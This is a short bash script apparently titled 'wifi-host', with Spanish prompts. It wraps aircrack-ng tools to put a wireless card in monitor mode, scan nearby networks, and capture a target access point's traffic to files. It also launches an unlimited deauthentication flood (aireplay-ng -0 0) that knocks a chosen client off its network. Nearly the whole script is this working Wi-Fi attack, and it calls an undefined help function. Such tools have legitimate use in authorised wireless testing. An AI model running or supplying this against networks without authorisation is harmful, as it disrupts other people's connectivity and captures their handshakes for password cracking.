#!/usr/bin/bash

# Author: clhore

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#global variables
tmpDirectoy='scan/'
cardFile='.networkCard'



trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour}Saliendo${endColour}"
	tput cnorm;airmon-ng stop "${networkCard}mon" 2>/dev/null
	exit 0
}

function banner(){

	echo -e "
           _  __ _        _               _   
          (_)/ _(_)      | |             | |  
 __      ___| |_ _ ______| |__   ___  ___| |_ 
 \ \ /\ / / |  _| |______| '_ \ / _ \/ __| __|
  \ V  V /| | | | |      | | | | (_) \__ \ |_   [ Author: clhore ]
   \_/\_/ |_|_| |_|      |_| |_|\___/|___/\__| 


	   "
}

function createTmpDirectory(){
	mkdir $tmpDirectoy
}

function configInterface(){
	banner
	
	read -p "Select networkCard: " networkCard
	airmon-ng start $networkCard
	echo $networkCard > $cardFile
}

function allScan(){
	airodump-ng ${networkCard}mon
}

function redScan(){
	airodump-ng --bssid $BSSID --channel $CH --write $tmpDirectoy "${networkCard}mon"
}

function hostDeauthentication(){
	aireplay-ng -0 0 -a $BSSID -c $ST "${networkCard}mon"
}

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0; while getopts ":b:c:s:h:" arg; do
		case $arg in
			b) BSSID=$OPTARG; let parameter_counter+=1 ;;
			c) CH=$OPTARG; let parameter_counter+=1 ;;
			s) ST=$OPTARG; let parameter_counter+=2 ;;
			h) helpPanel;;
		esac
	done
	if [ $parameter_counter -eq 0 ]; then
		createTmpDirectory
		configInterface
		clear
		allScan

	elif [ $parameter_counter -eq 2 ]; then
		networkCard=$(cat $cardFile)
		redScan

	elif [ $parameter_counter -eq 3 ]; then
		networkCard=$(cat $cardFile)
		hostDeauthentication
	fi
else
	echo 'Ejecute el script como root'
fi
tput cnorm
